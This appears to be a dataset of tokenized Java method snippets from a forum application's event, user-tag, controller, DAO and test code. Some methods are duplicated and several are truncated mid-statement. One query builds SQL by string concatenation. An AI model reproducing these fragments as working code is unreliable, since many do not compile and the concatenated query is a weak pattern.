public UserEvent mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum type = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , type , eventMessage , eventDate , unread ) ; 
public void addUserRefEvent ( User [ ] refs , int topic , int comment ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " type " , UserEventFilterEnum . REFERENCE . getType ( ) , " private " , false , " message_id " , topic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public void addUserRefEvent ( User [ ] refs , int topic ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " type " , UserEventFilterEnum . REFERENCE . getType ( ) , " private " , false , " message_id " , topic ) ; } insert . executeBatch ( batch ) ; } 
public void addReplyEvent ( User parentAuthor , int topicId , int commentId ) { insert . execute ( ImmutableMap . < String , Object > of ( " userid " , parentAuthor . getId ( ) , 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , UserEventFilterEnum eventFilter ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilter ! = UserEventFilterEnum . ALL ) queryPart = " AND type = ' " + eventFilter . getType ( ) + " ' " ; queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public UserEvent mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum type = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , type , eventMessage , eventDate , unread ) ; 
public void creanEvents ( ) { userEventDao . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void creanEvents ( ) { userEventService . cleanupOldEvents ( MAX_EVENTS ) ; } 
public void addEvent ( String eventType , int userId , boolean isPrivate , Integer topicId , Integer commentId , String message ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " userid " , userId ) ; params . put ( " type " , eventType ) ; params . put ( " private " , isPrivate ) ; if ( topicId ! = null ) { params . put ( " message_id " , topicId ) ; } if ( commentId ! = null ) { params . put ( " comment_id " , commentId ) ; } if ( message ! = null ) { params . put ( " message " , message ) ; } insert . execute ( params ) ; } 
public void resetUnreadReplies ( int userId ) { jdbcTemplate . update ( UPDATE_RESET_UNREAD_REPLIES , userId ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , userId ) ; } 
public void cleanupOldEvents ( int userId , int maxEventsPerUser ) { jdbcTemplate . update ( " DELETE FROM user_events WHERE user_events.id IN (SELECT id FROM user_events WHERE userid=? ORDER BY event_date DESC OFFSET ?) " , 
public List < UserEvent > getRepliesForUser ( int userId , boolean showPrivate , int topics , int offset , String eventFilterType ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilterType ! = null ) { queryPart = " AND type = ' " + eventFilterType + " ' " ; } queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , new RowMapper < UserEvent > ( ) { @Override 
public void addUserRefEvent ( User [ ] users , int topicId , int commentId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addUserRefEvent ( User [ ] users , int topicId ) { for ( User user : users ) { userEventDao . addEvent ( 
public void addReplyEvent ( User parentAuthor , int topicId , int commentId ) { userEventDao . addEvent ( UserEventFilterEnum . ANSWERS . getType ( ) , 
public void cleanupOldEvents ( final int maxEventsPerUser ) { List < Integer > oldEventsList = userEventDao . getUserIdListByOldEvents ( maxEventsPerUser ) ; for ( int userId : oldEventsList ) { logger . info ( " Cleaning up messages for userid= " + userId ) ; 
public List < UserEvent > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , UserEventFilterEnum eventFilter ) { String eventFilterType = null ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { eventFilterType = eventFilter . getType ( ) ; } return userEventDao . getRepliesForUser ( user . getId ( ) , showPrivate , topics , offset , eventFilterType ) ; } 
public void resetUnreadReplies ( User user ) { userEventDao . resetUnreadReplies ( user . getId ( ) ) ; } 
public ModelAndView showList ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userDao . getUser ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public void addTag ( int userId , int tagId , boolean isFavorite ) { jdbcTemplate . update ( " INSERT INTO user_tags (user_id, tag_id, is_favorite) VALUES(?,?,?) " , 
public void deleteTag ( int userId , int tagId , boolean isFavorite ) { jdbcTemplate . update ( " DELETE FROM user_tags WHERE user_id=? and tag_id=? and is_favorite=? " , 
public void deleteTags ( int tagId ) { jdbcTemplate . update ( " DELETE FROM user_tags WHERE tag_id=? " , tagId ) ; } 
public UserTagDao getUserTagDao ( ) throws Exception { UserTagDao userTagDao = mock ( UserTagDao . class ) ; return userTagDao ; } 
private int createUser ( String userName ) { int userid = jdbcTemplate . queryForInt ( " SELECT nextval('s_uid') AS userid " ) ; jdbcTemplate . update ( " INSERT INTO users (id, name, nick) VALUES (?, ?, ?) " , userid , userName , userName ) ; return userid ; } 
private int createTag ( String tagName ) { jdbcTemplate . update ( " INSERT INTO tags_values (value) VALUES (?) " , tagName ) ; return jdbcTemplate . queryForInt ( " SELECT currval('tags_values_id_seq') AS tagid " ) ; } 
public void prepareTestData ( ) { cleanupTestData ( ) ; user1Id = createUser ( " UserTagDaoIntegrationTest_user1 " ) ; user2Id = createUser ( " UserTagDaoIntegrationTest_user2 " ) ; tag1Id = createTag ( " UserTagDaoIntegrationTest_tag1 " ) ; tag2Id = createTag ( " UserTagDaoIntegrationTest_tag2 " ) ; tag3Id = createTag ( " UserTagDaoIntegrationTest_tag3 " ) ; tag4Id = createTag ( " UserTagDaoIntegrationTest_tag4 " ) ; tag5Id = createTag ( " UserTagDaoIntegrationTest_tag5 " ) ; } 
public void cleanupTestData ( ) { jdbcTemplate . update ( " DELETE FROM user_TAGS WHERE user_id in ( " + user1Id + " , " + user2Id + " ) " ) ; jdbcTemplate . update ( " DELETE FROM users WHERE nick LIKE 'UserTagDaoIntegrationTest_user%' " ) ; jdbcTemplate . update ( " DELETE FROM tags_values WHERE value LIKE 'UserTagDaoIntegrationTest_tag%' " 
private void prepareUserTags ( ) { userTagDao . addTag ( user1Id , tag1Id , true ) ; userTagDao . addTag ( user2Id , tag1Id , true ) ; userTagDao . addTag ( user1Id , tag2Id , true ) ; userTagDao . addTag ( user1Id , tag2Id , false ) ; userTagDao . addTag ( user2Id , tag2Id , true ) ; userTagDao . addTag ( user2Id , tag3Id , true ) ; userTagDao . addTag ( user1Id , tag3Id , true ) ; userTagDao . addTag ( user2Id , tag4Id , true ) ; userTagDao . addTag ( user1Id , tag4Id , true ) ; userTagDao . addTag ( user1Id , tag5Id , false ) ; userTagDao . addTag ( user2Id , tag5Id , true ) ; userTagDao . addTag ( user1Id , tag5Id , true ) ; } 
public void addTest ( ) { prepareUserTags ( ) ; try { userTagDao . addTag ( user1Id , tag1Id , true ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } userTagDao . addTag ( user1Id , tag1Id , false ) ; try { userTagDao . addTag ( user1Id , tag1Id , false ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , tag1Id , true ) ; userTagDao . deleteTag ( user1Id , tag2Id , true ) ; int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , tag2Id , false ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( tag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=false AND user_id=? " , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE is_favorite=true AND user_id=? " , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public int addToMemories ( int userid , int topic ) { List < Integer > res = jdbcTemplate . queryForList ( " SELECT id FROM memories WHERE userid=? AND topic=? FOR UPDATE " , Integer . class , userid , topic ) ; if ( res . isEmpty ( ) ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( " userid " , userid , " topic " , topic ) ) . intValue ( ) ; 
public ModelAndView showList ( HttpServletRequest request ) throws AccessViolationException , UserNotFoundException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; return modelAndView ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) throws UserNotFoundException { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } return ignoreMap ; } 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView ignoreTagDel ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . ignoreDel ( user , tagName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public void favoriteAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagIdByName ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , true ) ; } 
public void favoriteDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagIdByName ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , true ) ; } 
public void ignoreAdd ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagIdByName ( tagName ) ; userTagDao . addTag ( user . getId ( ) , tagId , false ) ; } 
public void ignoreDel ( User user , String tagName ) throws TagNotFoundException { int tagId = tagDao . getTagIdByName ( tagName ) ; userTagDao . deleteTag ( user . getId ( ) , tagId , false ) ; } 
public ImmutableList < String > favoritesGet ( User user ) { return userTagDao . getTags ( user . getId ( ) , true ) ; } 
public ImmutableList < String > ignoresGet ( User user ) { return userTagDao . getTags ( user . getId ( ) , false ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagDao ) ; when ( tagDao . getTagIdByName ( " tag1 " ) ) . thenReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) throws TagNotFoundException { when ( tagDao . getTagIdByName ( " tag1 " ) ) . thenReturn ( 2 ) ; userTagService . favoriteAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void favoriteDelTest ( ) throws TagNotFoundException { userTagService . favoriteDel ( user , " tag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( true ) ) ; } 
public void ignoreAddTest ( ) throws TagNotFoundException { userTagService . ignoreAdd ( user , " tag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void ignoreDelTest ( ) throws TagNotFoundException { userTagService . ignoreDel ( user , " tag1 " ) ; verify ( userTagDao ) . deleteTag ( eq ( 1 ) , eq ( 2 ) , eq ( false ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , true ) ) . thenReturn ( etalon ) ; ImmutableList < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " tag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . thenReturn ( etalon ) ; ImmutableList < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . get ( 0 ) , actual . get ( 0 ) ) ; } 
public UserTagDao getUserTagDao ( ) throws Exception { UserTagDao userTagDao = mock ( UserTagDao . class ) ; return userTagDao ; } 
public TagDao getTagDao ( ) throws Exception { TagDao tagDao = mock ( TagDao . class ) ; return tagDao ; } 
public void addUserTagEvent ( List < Integer > userIdList , int topicId ) { for ( Integer userId : userIdList ) { userEventDao . addEvent ( 
public void addTag ( int userId , int tagId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " tag_id " , tagId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; jdbcTemplate . update ( " INSERT INTO user_tags (user_id, tag_id, is_favorite) VALUES(:user_id, :tag_id, :is_favorite) " , 
public void deleteTag ( int userId , int tagId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " tag_id " , tagId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; jdbcTemplate . update ( " DELETE FROM user_tags WHERE user_id=:user_id and tag_id=:tag_id and is_favorite=:is_favorite " , 
public void deleteTags ( int tagId ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " tag_id " , tagId ) ; jdbcTemplate . update ( " DELETE FROM user_tags WHERE tag_id=:tag_id " , parameters ) ; } 
public List < Integer > getUserIdListByTags ( List < String > tags ) { return userTagDao . getUserIdListByTags ( tags ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored + queryPartTagIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query ; if ( filter ! = TrackerFilter . ZERO ) { query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; } else { query = String . format ( queryTrackerZeroMain , partIgnored ) ; } return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public ModelAndView showList ( HttpServletRequest request ) throws AccessViolationException , UserNotFoundException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } return modelAndView ; } 
public void replaceTag ( int oldTagId , int newTagId ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " new_tag_id " , newTagId ) ; parameters . addValue ( " old_tag_id " , oldTagId ) ; jdbcTemplate . update ( " UPDATE user_tags SET tag_id=:new_tag_id WHERE tag_id=:old_tag_id " + 
public void addTest ( ) { prepareUserTags ( ) ; try { userTagDao . addTag ( user1Id , tag1Id , true ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } userTagDao . addTag ( user1Id , tag1Id , false ) ; try { userTagDao . addTag ( user1Id , tag1Id , false ) ; Assert . fail ( " Duplicate key check fail! " ) ; } catch ( DuplicateKeyException ignored ) { } int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , tag1Id , true ) ; userTagDao . deleteTag ( user1Id , tag2Id , true ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , tag2Id , false ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( tag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( tag1Id ) ; userTagDao . replaceTag ( tag2Id , tag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void recalcTagsCounters ( ) { tagService . reCalculateAllCounters ( ) ; } 
public void reCalculateAllCounters ( ) { for ( ITagActionHandler actionHandler : actionHandlers ) { actionHandler . reCalculateAllCounters ( ) ; 
public static EditInfoDto createFromMessage ( TopicTagService topicTagService , Topic message , String text ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( text ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagService . toString ( topicTagService . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void addTag ( int msgId , int tagId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , msgId , tagId ) ; } 
public void deleteTag ( int msgId , int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , msgId , tagId ) ; 
public void replaceTag ( int oldTagId , int newTagId ) { jdbcTemplate . update ( " UPDATE tags SET tagid=? WHERE tagid=? AND msgid NOT IN (SELECT msgid FROM tags WHERE tagid=?) " , 
public void deleteTag ( int tagId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , tagId ) ; } 
public void reCalculateAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted) " ) ; } 
public void reCalculateAllCounters ( ) { topicTagDao . reCalculateAllCounters ( ) ; } 
private void addToReplaceHandlerList ( ) { tagService . getActionHandlers ( ) . add ( actionHandler ) ; } 
public void replaceTag ( int oldTagId , String oldTagName , int newTagId , String newTagName ) { userTagDao . replaceTag ( oldTagId , newTagId ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | tmpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public boolean hasFavoriteTag ( User user , String tagName ) { ImmutableList < String > tags = favoritesGet ( user ) ; return tags . contains ( tagName ) ; } 
public boolean hasIgnoreTag ( User user , String tagName ) { ImmutableList < String > tags = ignoresGet ( user ) ; return tags . contains ( tagName ) ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
